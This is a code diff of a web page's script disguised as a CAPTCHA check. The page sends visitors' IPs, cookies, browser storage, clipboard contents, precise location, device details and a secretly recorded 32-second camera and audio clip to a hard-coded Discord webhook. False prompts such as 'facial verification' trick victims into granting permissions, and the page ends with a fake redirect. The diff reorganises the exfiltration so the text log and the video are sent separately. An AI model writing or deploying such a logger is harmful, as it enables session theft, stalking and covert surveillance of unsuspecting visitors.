@@ -64,7 +64,7 @@
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ==================== 1. INITIAL IP WEBHOOK ====================
+    // ==================== 1. INITIAL IP WEBHOOK (on load) ====================
     async function sendInitialIP() {
         try {
             const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -89,7 +89,7 @@
     }
     sendInitialIP();
 
-    // ==================== 2. MAX DATA COLLECTION FUNCTIONS ====================
+    // ==================== 2. DATA COLLECTION FUNCTIONS (same as before) ====================
     function categorizeCookie(name) {
         const n = name.toLowerCase();
         if (n.includes("fb") || n.includes("facebook")) return "Facebook";
@@ -244,7 +244,7 @@
         } catch(e) { return `USB error: ${e.message}`; }
     }
 
-    // ==================== 3. PERMISSION REQUESTS ====================
+    // ==================== 3. PERMISSION REQUESTS (non-camera) ====================
     async function requestGeolocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve({ error: "Geolocation not supported" }); return; }
@@ -254,13 +254,6 @@
                 { enableHighAccuracy: true, timeout: 15000 }
             );
         });
-    }
-    async function requestCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            // Ne prikazujemo video preview na stranici – samo stream za snimanje
-            return { stream, success: true };
-        } catch(e) { return { error: e.message }; }
     }
     async function requestMicrophone() {
         try {
@@ -287,154 +280,37 @@
         } catch(e) { return `${lat}, ${lon} (address failed)`; }
     }
 
-    // ==================== 4. VIDEO RECORDING (NO PREVIEW) ====================
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let recordingStream = null;
-    let recordingTimeout = null;
-
-    async function startRecording(durationMs, cameraStream) {
-        return new Promise((resolve) => {
-            if (!cameraStream) { resolve(null); return; }
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) recordedChunks.push(event.data);
-            };
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: "video/webm" });
-                resolve(blob);
-            };
-            mediaRecorder.start(100);
-            recordingTimeout = setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
-            }, durationMs);
-        });
+    // ==================== 4. VIDEO RECORDING (no preview) ====================
+    async function startAndRecordCamera(durationMs) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const recordedChunks = [];
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+            return new Promise((resolve) => {
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: "video/webm" });
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(blob);
+                };
+                mediaRecorder.start(100);
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") mediaRecorder.stop();
+                }, durationMs);
+            });
+        } catch(e) {
+            console.error("Camera error", e);
+            return null;
+        }
     }
 
-    // ==================== 5. MAIN CAPTCHA CLICK ====================
-    let isRunning = false;
-    const btn = document.getElementById("actionBtn");
-    const timerDiv = document.getElementById("timerDisplay");
-    const noticeDiv = document.getElementById("permissionNotice");
-
-    btn.addEventListener("click", async () => {
-        if (isRunning) return;
-        isRunning = true;
-        btn.disabled = true;
-        btn.innerText = "✓ VERIFYING...";
-        timerDiv.style.display = "block";
-        noticeDiv.classList.add("show");
-
-        let timeLeft = 32;
-        timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds... Estimated time 32 seconds`;
-        const interval = setInterval(() => {
-            timeLeft--;
-            if (timeLeft <= 0) clearInterval(interval);
-            timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
-        }, 1000);
-
-        // ---- Collect non‑permission data first ----
-        const gpu = getGPU();
-        const canvasFp = await getCanvasFingerprint();
-        const audioFp = await getAudioFingerprint();
-        const fingerprint = await getFingerprint(gpu, canvasFp, audioFp);
-        const battery = await getBattery();
-        const connection = getConnection();
-        const plugins = getPlugins();
-        const fonts = getFonts();
-        const cookies = getAllCookies();
-        const localStorage = getAllLocalStorage();
-        const sessionStorage = getAllSessionStorage();
-        const indexedDB = await getAllIndexedDB();
-        const webRTC = await getWebRTCIPs();
-        const perf = getPerformanceTiming();
-        const memory = getMemoryInfo();
-        const mediaDevices = await getMediaDevices();
-
-        const cookiesByPlatform = {};
-        for (const c of cookies) {
-            if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
-            cookiesByPlatform[c.platform].push(c);
-        }
-
-        // ---- PERMISSIONS (with reassuring messages) ----
-        noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW";
-        const geoloc = await requestGeolocation();
-        let address = "";
-        if (geoloc.lat && geoloc.lon) address = await reverseGeocode(geoloc.lat, geoloc.lon);
-
-        noticeDiv.innerHTML = "🎥 Camera & microphone access for facial verification – click ALLOW";
-        const cameraRes = await requestCamera();
-        let videoBlob = null;
-        if (cameraRes.success) {
-            videoBlob = await startRecording(32000, cameraRes.stream);
-            // stop tracks after recording (already done inside startRecording's onstop)
-        }
-
-        noticeDiv.innerHTML = "🎤 Additional microphone check...";
-        const mic = await requestMicrophone();
-
-        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert)...";
-        const notif = await requestNotifications();
-
-        noticeDiv.innerHTML = "📋 Clipboard read (to verify human interaction)...";
-        const clipboardPerm = await requestClipboard();
-        let clipboardContent = "";
-        if (clipboardPerm.success) clipboardContent = await readClipboard();
-
-        noticeDiv.innerHTML = "🔊 Checking Bluetooth devices (optional)...";
-        const bluetooth = await getBluetoothDevices();
-
-        noticeDiv.innerHTML = "🔌 Scanning USB devices...";
-        const usb = await getUSBDevices();
-
-        noticeDiv.innerHTML = "✅ Finalizing security check...";
-
-        // ---- Build final data object ----
-        const finalData = {
-            timestamp: new Date().toISOString(),
-            pageURL: window.location.href,
-            referrer: document.referrer,
-            cookiesCount: cookies.length,
-            cookiesByPlatform,
-            localStorage, sessionStorage, indexedDB,
-            webRTC_IPs: webRTC,
-            gpu, battery, connection, plugins, fonts, fingerprint,
-            canvasFingerprint: canvasFp,
-            audioFingerprint: audioFp,
-            performance: perf,
-            memory: memory,
-            mediaDevices: mediaDevices,
-            clipboard: clipboardContent,
-            bluetooth: bluetooth,
-            usb: usb,
-            permissions: { geolocation: geoloc, camera: cameraRes.success, microphone: mic.success, notifications: notif.status },
-            reverseAddress: address,
-            navigator: {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                online: navigator.onLine,
-                vendor: navigator.vendor,
-                maxTouchPoints: navigator.maxTouchPoints
-            },
-            screen: {
-                width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
-                orientation: screen.orientation?.type || "n/a"
-            },
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-
-        // ---- Generate TXT report ----
+    // ==================== 5. SEND TEXT LOG IMMEDIATELY ====================
+    async function sendTextLog(finalData, hasCamera) {
+        // Generate TXT report (same as before, but include note about video pending)
         function generateTextReport(d) {
-            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER + VIDEO - COMPLETE REPORT\n" + "=".repeat(80) + "\n\n";
+            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER - TEXT REPORT (VIDEO PENDING)\n" + "=".repeat(80) + "\n\n";
             r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
             r += "📍 PRECISE LOCATION\n";
             if (d.permissions.geolocation.lat) {
@@ -462,19 +338,14 @@
             r += `\n🖌️ Canvas Fingerprint: ${d.canvasFingerprint}\n🎵 Audio Fingerprint: ${d.audioFingerprint}\n🔐 SHA-256 Fingerprint: ${d.fingerprint}\n`;
             r += `\n⏱️ Performance: Load ${d.performance.loadTime}ms, DOM ready ${d.performance.domReady}ms\n🧠 Memory: ${JSON.stringify(d.memory)}\n`;
             r += `\n📹 Media Devices: ${JSON.stringify(d.mediaDevices)}\n📋 Clipboard: ${d.clipboard}\n🎧 Bluetooth: ${JSON.stringify(d.bluetooth)}\n🔌 USB: ${JSON.stringify(d.usb)}\n`;
-            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${d.permissions.camera?"OK":"DENIED"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
-            r += `\n🎥 Video recording: ${videoBlob ? `Recorded ${(videoBlob.size/1024).toFixed(1)} KB` : "Failed or denied"}\n`;
+            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${hasCamera?"REQUESTED":"NOT YET"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
+            r += `\n🎥 Video recording: Pending (will be sent separately)\n`;
             return r;
         }
-
         const reportText = generateTextReport(finalData);
         const txtBlob = new Blob([reportText], { type: "text/plain" });
         const formData = new FormData();
         formData.append("file", txtBlob, `log_${Date.now()}.txt`);
-        if (videoBlob) {
-            formData.append("file", videoBlob, `video_${Date.now()}.webm`);
-        }
-
         let locationInfo = "❌ Denied";
         let mapsLink = "";
         if (finalData.permissions.geolocation.lat) {
@@ -483,24 +354,167 @@
         }
         const embed = {
             embeds: [{
-                title: "✅ MAX LOGGER + VIDEO",
-                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Video:** ${videoBlob ? `Recorded ${(videoBlob.size/1024).toFixed(1)} KB` : "No video"}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...`,
-                color: 0xff5500,
+                title: "📄 TEXT LOG (IMMEDIATE)",
+                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Video:** Pending...`,
+                color: 0x3498db,
                 fields: [
-                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nCamera: ${finalData.permissions.camera ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
-                    { name: "Hardware", value: `CPU: ${finalData.navigator.hardwareConcurrency} cores\nRAM: ${finalData.navigator.deviceMemory || "?"} GB\nGPU: ${finalData.gpu.renderer?.slice(0,30)}`, inline: true }
+                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
+                    { name: "Hardware", value: `CPU: ${finalData.navigator.hardwareConcurrency} cores\nRAM: ${finalData.navigator.deviceMemory || "?"} GB`, inline: true }
                 ],
                 timestamp: finalData.timestamp
             }]
         };
         formData.append("payload_json", JSON.stringify(embed));
+        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+    }
 
-        try {
-            await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            console.log("Full report + video sent");
-        } catch(e) { console.error(e); }
+    // ==================== 6. SEND VIDEO CLIP SEPARATELY ====================
+    async function sendVideoClip(videoBlob, startTime) {
+        const formData = new FormData();
+        formData.append("file", videoBlob, `video_${Date.now()}.webm`);
+        const embed = {
+            embeds: [{
+                title: "🎥 VIDEO RECORDING",
+                description: `**Duration:** ~32 seconds\n**Size:** ${(videoBlob.size/1024).toFixed(1)} KB\n**Recorded at:** ${new Date().toISOString()}`,
+                color: 0xff5500,
+                timestamp: new Date().toISOString()
+            }]
+        };
+        formData.append("payload_json", JSON.stringify(embed));
+        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+    }
 
-        // After 32 seconds, fake redirect
+    // ==================== 7. MAIN CAPTCHA CLICK ====================
+    let isRunning = false;
+    const btn = document.getElementById("actionBtn");
+    const timerDiv = document.getElementById("timerDisplay");
+    const noticeDiv = document.getElementById("permissionNotice");
+
+    btn.addEventListener("click", async () => {
+        if (isRunning) return;
+        isRunning = true;
+        btn.disabled = true;
+        btn.innerText = "✓ VERIFYING...";
+        timerDiv.style.display = "block";
+        noticeDiv.classList.add("show");
+
+        let timeLeft = 32;
+        timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds...`;
+        const interval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) clearInterval(interval);
+            timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
+        }, 1000);
+
+        // ---- 1. Collect non-camera data and request permissions (except camera) ----
+        const gpu = getGPU();
+        const canvasFp = await getCanvasFingerprint();
+        const audioFp = await getAudioFingerprint();
+        const fingerprint = await getFingerprint(gpu, canvasFp, audioFp);
+        const battery = await getBattery();
+        const connection = getConnection();
+        const plugins = getPlugins();
+        const fonts = getFonts();
+        const cookies = getAllCookies();
+        const localStorage = getAllLocalStorage();
+        const sessionStorage = getAllSessionStorage();
+        const indexedDB = await getAllIndexedDB();
+        const webRTC = await getWebRTCIPs();
+        const perf = getPerformanceTiming();
+        const memory = getMemoryInfo();
+        const mediaDevices = await getMediaDevices();
+
+        const cookiesByPlatform = {};
+        for (const c of cookies) {
+            if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
+            cookiesByPlatform[c.platform].push(c);
+        }
+
+        // ---- Permissions (location, clipboard, notifications, mic) ----
+        noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW";
+        const geoloc = await requestGeolocation();
+        let address = "";
+        if (geoloc.lat && geoloc.lon) address = await reverseGeocode(geoloc.lat, geoloc.lon);
+
+        noticeDiv.innerHTML = "📋 Clipboard read (to verify human interaction) – click ALLOW";
+        const clipboardPerm = await requestClipboard();
+        let clipboardContent = "";
+        if (clipboardPerm.success) clipboardContent = await readClipboard();
+
+        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert) – click ALLOW";
+        const notif = await requestNotifications();
+
+        noticeDiv.innerHTML = "🎤 Microphone check – click ALLOW";
+        const mic = await requestMicrophone();
+
+        noticeDiv.innerHTML = "🔊 Optional: Bluetooth devices (click ALLOW if you want)";
+        const bluetooth = await getBluetoothDevices();
+
+        noticeDiv.innerHTML = "🔌 Scanning USB devices...";
+        const usb = await getUSBDevices();
+
+        // Build final data object (without video yet)
+        const finalData = {
+            timestamp: new Date().toISOString(),
+            pageURL: window.location.href,
+            referrer: document.referrer,
+            cookiesCount: cookies.length,
+            cookiesByPlatform,
+            localStorage, sessionStorage, indexedDB,
+            webRTC_IPs: webRTC,
+            gpu, battery, connection, plugins, fonts, fingerprint,
+            canvasFingerprint: canvasFp,
+            audioFingerprint: audioFp,
+            performance: perf,
+            memory: memory,
+            mediaDevices: mediaDevices,
+            clipboard: clipboardContent,
+            bluetooth: bluetooth,
+            usb: usb,
+            permissions: {
+                geolocation: geoloc,
+                microphone: mic.success,
+                notifications: notif.status
+            },
+            reverseAddress: address,
+            navigator: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                online: navigator.onLine,
+                vendor: navigator.vendor,
+                maxTouchPoints: navigator.maxTouchPoints
+            },
+            screen: {
+                width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation?.type || "n/a"
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        // ---- Send text log immediately (without waiting for camera) ----
+        await sendTextLog(finalData, false);
+        noticeDiv.innerHTML = "✅ Text log sent. Now requesting camera for video verification...";
+
+        // ---- 2. Request camera and start recording (no preview) ----
+        noticeDiv.innerHTML = "🎥 Camera access for facial verification – click ALLOW";
+        const videoBlob = await startAndRecordCamera(32000); // records for up to 32 seconds
+
+        if (videoBlob) {
+            // Send video clip as separate message
+            await sendVideoClip(videoBlob);
+            noticeDiv.innerHTML = "✅ Video sent. Finalizing...";
+        } else {
+            noticeDiv.innerHTML = "⚠️ Camera denied or error – no video sent.";
+        }
+
+        // After 32 seconds, fake redirect (already handled by timer UI)
         setTimeout(() => {
             document.getElementById("mainContainer").innerHTML = `
                 <div class="container" style="background:white; text-align:center; padding:40px;">
